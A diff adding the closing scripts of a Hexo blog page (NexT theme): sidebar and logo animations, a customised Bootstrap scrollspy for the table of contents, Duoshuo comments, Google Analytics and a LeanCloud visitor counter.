+    var sidebarToggleLine3rdStatusArrow = {width: '50%', rotateZ: '45deg', top: '-2px'};
+    var sidebarToogleLine3rdStatusClose = {width: '100%', rotateZ: '45deg', top: '-5px'};
+
+    LogoAndMenuMotion();
+    sidebarToggleMotion();
+    postsListMotion();
+    backToTopMotion();
+
+
+    $(document)
+      .on('sidebar.isShowing', function () {
+        isDesktop() && body.velocity(
+          {paddingRight: SIDEBAR_WIDTH},
+          SIDEBAR_DISPLAY_DURATION
+        );
+        sidebarContentMotion();
+      })
+      .on('sidebar.isHiding', function () {});
+
+    function LogoAndMenuMotion() {
+      $.Velocity.RunSequence([
+        { e: $('.brand'), p: { opacity: 1 }, o: { duration: 100 } },
+        { e: $('.logo'), p: { opacity: 1, top: 0 }, o: { duration: 50} },
+        
+        { e: $('.logo-line-before i'), p: { translateX: "100%" }, o: { duration: 500, sequenceQueue: false } },
+        { e: $('.logo-line-after i'), p: { translateX: "-100%" }, o: { duration: 500, sequenceQueue: false } },
+        
+        { e: $('.site-title'), p: { opacity: 1, top: 0 }, o: { duration: 200 } }
+      ]);
+      $('.menu-item').velocity('transition.slideDownIn', {display: null});
+    }
+
+
+    function backToTopMotion () {
+      var b2top = $('.back-to-top');
+      b2top.on('click', function () {
+        body.velocity('scroll');
+      });
+    }
+
+    function sidebarShowMotion () {
+
+      sidebarToggleLine1st.velocity(sidebarToogleLine1stStatusClose);
+      sidebarToggleLine2nd.velocity(sidebarToogleLine2ndStatusClose);
+      sidebarToggleLine3rd.velocity(sidebarToogleLine3rdStatusClose);
+
+      sidebar.velocity({width: SIDEBAR_WIDTH}, {
+        display: 'block',
+        duration: SIDEBAR_DISPLAY_DURATION,
+        complete: function () {
+          sidebar.addClass('sidebar-active');
+          sidebar.trigger('sidebar.didShow');
+        }
+      });
+      sidebar.trigger('sidebar.isShowing');
+    }
+
+    function sidebarHideMotion () {
+      isDesktop() && body.velocity({paddingRight: 0});
+      sidebar.velocity('reverse');
+
+      sidebarToggleLine1st.velocity(sidebarToggleLine1stStatusInit);
+      sidebarToggleLine2nd.velocity(sidebarToggleLine2ndStatusInit);
+      sidebarToggleLine3rd.velocity(sidebarToggleLine3rdStatusInit);
+
+      sidebar.removeClass('sidebar-active');
+      sidebar.trigger('sidebar.isHiding');
+    };
+
+    function sidebarContentMotion () {
+      $('.sidebar .motion-element').velocity(
+        'transition.slideRightIn',
+        {stagger: 50, drag: true}
+      );
+    }
+
+    function postsListMotion () {
+      var postMotionOptions = window.postMotionOptions || {stagger: 300, drag: true};
+      $('.post').velocity('transition.slideDownIn', postMotionOptions);
+    }
+
+    function sidebarToggleMotion () {
+      sidebarToggle.on('click', function () {
+        isSidebarVisible ? sidebarHideMotion() : sidebarShowMotion();
+        isSidebarVisible = !isSidebarVisible;
+      });
+
+      sidebarToggle.hover(function () {
+        if (isSidebarVisible) {return}
+        sidebarToggleLine1st.velocity('stop').velocity(sidebarToggleLine1stStatusArrow);
+        sidebarToggleLine2nd.velocity('stop').velocity(sidebarToggleLine2ndStatusArrow);
+        sidebarToggleLine3rd.velocity('stop').velocity(sidebarToggleLine3rdStatusArrow);
+      }, function () {
+        if (isSidebarVisible) {return}
+        sidebarToggleLine1st.velocity('stop').velocity(sidebarToggleLine1stStatusInit);
+        sidebarToggleLine2nd.velocity('stop').velocity(sidebarToggleLine2ndStatusInit);
+        sidebarToggleLine3rd.velocity('stop').velocity(sidebarToggleLine3rdStatusInit);
+      });
+    }
+  });
+
+</script>
+
+
+
+
+
+  
+  
+<script type="text/javascript" id="bootstrap.scrollspy.custom">
+  /* ========================================================================
+  * Bootstrap: scrollspy.js v3.3.2
+  * http://getbootstrap.com/javascript/#scrollspy
+  * ========================================================================
+  * Copyright 2011-2015 Twitter, Inc.
+  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
+  * ======================================================================== */
+
+  /**
+   * Custom by iissnan
+   *
+   * - Add a `clear.bs.scrollspy` event.
+   * - Esacpe targets selector.
+   */
+
+
+  +function ($) {
+    'use strict';
+
+    // SCROLLSPY CLASS DEFINITION
+    // ==========================
+
+    function ScrollSpy(element, options) {
+      this.$body          = $(document.body)
+      this.$scrollElement = $(element).is(document.body) ? $(window) : $(element)
+      this.options        = $.extend({}, ScrollSpy.DEFAULTS, options)
+      this.selector       = (this.options.target || '') + ' .nav li > a'
+      this.offsets        = []
+      this.targets        = []
+      this.activeTarget   = null
+      this.scrollHeight   = 0
+
+      this.$scrollElement.on('scroll.bs.scrollspy', $.proxy(this.process, this))
+      this.refresh()
+      this.process()
+    }
+
+    ScrollSpy.VERSION  = '3.3.2'
+
+    ScrollSpy.DEFAULTS = {
+      offset: 10
+    }
+
+    ScrollSpy.prototype.getScrollHeight = function () {
+      return this.$scrollElement[0].scrollHeight || Math.max(this.$body[0].scrollHeight, document.documentElement.scrollHeight)
+    }
+
+    ScrollSpy.prototype.refresh = function () {
+      var that          = this
+      var offsetMethod  = 'offset'
+      var offsetBase    = 0
+
+      this.offsets      = []
+      this.targets      = []
+      this.scrollHeight = this.getScrollHeight()
+
+      if (!$.isWindow(this.$scrollElement[0])) {
+        offsetMethod = 'position'
+        offsetBase   = this.$scrollElement.scrollTop()
+      }
+
+      this.$body
+        .find(this.selector)
+        .map(function () {
+          var $el   = $(this)
+          var href  = $el.data('target') || $el.attr('href')
+          var $href = /^#./.test(href) && $(escapeSelector(href)) // Need to escape selector.
+
+          return ($href
+            && $href.length
+            && $href.is(':visible')
+            && [[$href[offsetMethod]().top + offsetBase, href]]) || null
+        })
+        .sort(function (a, b) { return a[0] - b[0] })
+        .each(function () {
+          that.offsets.push(this[0])
+          that.targets.push(this[1])
+        })
+
+
+    }
+
+    ScrollSpy.prototype.process = function () {
+      var scrollTop    = this.$scrollElement.scrollTop() + this.options.offset
+      var scrollHeight = this.getScrollHeight()
+      var maxScroll    = this.options.offset + scrollHeight - this.$scrollElement.height()
+      var offsets      = this.offsets
+      var targets      = this.targets
+      var activeTarget = this.activeTarget
+      var i
+
+      if (this.scrollHeight != scrollHeight) {
+        this.refresh()
+      }
+
+      if (scrollTop >= maxScroll) {
+        return activeTarget != (i = targets[targets.length - 1]) && this.activate(i)
+      }
+
+      if (activeTarget && scrollTop < offsets[0]) {
+        $(this.selector).trigger('clear.bs.scrollspy')  // Add a custom event.
+        this.activeTarget = null
+        return this.clear()
+      }
+
+      for (i = offsets.length; i--;) {
+        activeTarget != targets[i]
+          && scrollTop >= offsets[i]
+          && (!offsets[i + 1] || scrollTop <= offsets[i + 1])
+          && this.activate(targets[i])
+      }
+    }
+
+    ScrollSpy.prototype.activate = function (target) {
+      this.activeTarget = target
+
+      this.clear()
+
+      var selector = this.selector +
+        '[data-target="' + target + '"],' +
+        this.selector + '[href="' + target + '"]'
+
+      var active = $(selector)
+        .parents('li')
+        .addClass('active')
+
+      if (active.parent('.dropdown-menu').length) {
+        active = active
+          .closest('li.dropdown')
+          .addClass('active')
+      }
+
+      active.trigger('activate.bs.scrollspy')
+    }
+
+    ScrollSpy.prototype.clear = function () {
+      $(this.selector)
+        .parentsUntil(this.options.target, '.active')
+        .removeClass('active')
+    }
+
+
+    // SCROLLSPY PLUGIN DEFINITION
+    // ===========================
+
+    function Plugin(option) {
+      return this.each(function () {
+        var $this   = $(this)
+        var data    = $this.data('bs.scrollspy')
+        var options = typeof option == 'object' && option
+
+        if (!data) $this.data('bs.scrollspy', (data = new ScrollSpy(this, options)))
+        if (typeof option == 'string') data[option]()
+      })
+    }
+
+    var old = $.fn.scrollspy
+
+    $.fn.scrollspy             = Plugin
+    $.fn.scrollspy.Constructor = ScrollSpy
+
+
+    // SCROLLSPY NO CONFLICT
+    // =====================
+
+    $.fn.scrollspy.noConflict = function () {
+      $.fn.scrollspy = old
+      return this
+    }
+
+
+    // SCROLLSPY DATA-API
+    // ==================
+
+    $(window).on('load.bs.scrollspy.data-api', function () {
+      $('[data-spy="scroll"]').each(function () {
+        var $spy = $(this)
+        Plugin.call($spy, $spy.data())
+      })
+    })
+
+  }(jQuery);
+</script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      if (isDesktop() && HEXO_SIDEBAR_CONFIGURATION === 'post') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    var HEXO_SIDEBAR_CONFIGURATION = 'hide';
+    $(document).ready(function () {
+      if (HEXO_SIDEBAR_CONFIGURATION === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"edward7l"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+  <script type="text/javascript">
+    (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
+        function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
+      e=o.createElement(i);r=o.getElementsByTagName(i)[0];
+      e.src='//www.google-analytics.com/analytics.js';
+      r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
+    ga('create','UA-56285224-2');ga('send','pageview');
+  </script>
+
+
+
+
+<!-- custom analytics part create by xiamo -->
+<script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+<script>AV.initialize("H5x8MIX7pIjP5j7QEyaFAqOB-gzGzoHsz", "OwiabOUHiOgHocVFrDv0sW8o");</script>
+<script>
+function showTime(Counter) {
+	var query = new AV.Query(Counter);
+	$(".leancloud_visitors").each(function() {
+		var url = $(this).attr("id").trim();
+		query.equalTo("url", url);
+		query.find({
+			success: function(results) {
+				if (results.length == 0) {
+					var content = '0 ' + $(document.getElementById(url)).text();
+					$(document.getElementById(url)).text(content);
+					return;
+				}
+				for (var i = 0; i < results.length; i++) {
+					var object = results[i];
+					var content = object.get('time') + ' ' + $(document.getElementById(url)).text();
+					$(document.getElementById(url)).text(content);
+				}
+			},
+			error: function(object, error) {
+				console.log("Error: " + error.code + " " + error.message);
+			}
+		});
+
+	});
+}
+
+function addCount(Counter) {
+	var Counter = AV.Object.extend("Counter");
+	url = $(".leancloud_visitors").attr('id').trim();
+	title = $(".leancloud_visitors").attr('data-flag-title').trim();
+	var query = new AV.Query(Counter);
+	query.equalTo("url", url);
+	query.find({
+		success: function(results) {
+			if (results.length > 0) {
+				var counter = results[0];
+				counter.fetchWhenSave(true);
+				counter.increment("time");
+				counter.save(null, {
+					success: function(counter) {
+						var content =  counter.get('time') + ' ' + $(document.getElementById(url)).text();
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(counter, error) {
+						console.log('Failed to save Visitor num, with error message: ' + error.message);
+					}
+				});
+			} else {
+				var newcounter = new Counter();
+				newcounter.set("title", title);
+				newcounter.set("url", url);
+				newcounter.set("time", 1);
+				newcounter.save(null, {
+					success: function(newcounter) {
+					    console.log("newcounter.get('time')="+newcounter.get('time'));
+						var content = newcounter.get('time') + ' ' + $(document.getElementById(url)).text();
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(newcounter, error) {
+						console.log('Failed to create');
+					}
+				});
+			}
+		},
+		error: function(error) {
+			console.log('Error:' + error.code + " " + error.message);
+		}
+	});
+}
+$(function() {
+	var Counter = AV.Object.extend("Counter");
+	if ($('.leancloud_visitors').length == 1) {
+		addCount(Counter);
+	} else if ($('.post-title-link').length > 1) {
+		showTime(Counter);
+	}
+}); 
+</script>
+
+
+</body>
+</html>
